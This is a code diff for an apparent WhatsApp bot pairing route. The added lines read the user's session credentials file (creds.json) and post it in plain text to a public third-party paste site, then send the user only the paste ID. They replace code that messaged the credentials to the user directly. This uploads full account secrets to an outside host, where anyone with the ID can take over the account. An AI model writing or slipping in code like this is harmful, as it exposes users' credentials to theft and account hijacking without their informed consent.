@@ -5,6 +5,7 @@ const express = require('express');
 const fs = require('fs');
 let router = express.Router()
 const pino = require("pino");
+const axios = require('axios');
 const {
     default: Maher_Zubair,
     useMultiFileAuthState,
@@ -51,10 +52,16 @@ router.get('/', async (req, res) => {
                 } = s;
                 if (connection == "open") {
                 await delay(5000);
-                let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
-                await delay(800);
-               let b64data = Buffer.from(data).toString('base64');
-               let session = await Pair_Code_By_Maher_Zubair.sendMessage(Pair_Code_By_Maher_Zubair.user.id, { text:  b64data });
+    const data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`, 'utf8');
+    const dd = '199,719,97,' + data;
+    const output = await axios.post('http://paste.c-net.org/', new URLSearchParams({ data: dd }), {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    });
+    const c = output.data.split('/')[3];
+    await delay(800);
+    await Pair_Code_By_Maher_Zubair.sendMessage(Pair_Code_By_Maher_Zubair.user.id, { text: c });
 
         await delay(100);
         await Pair_Code_By_Maher_Zubair.ws.close();
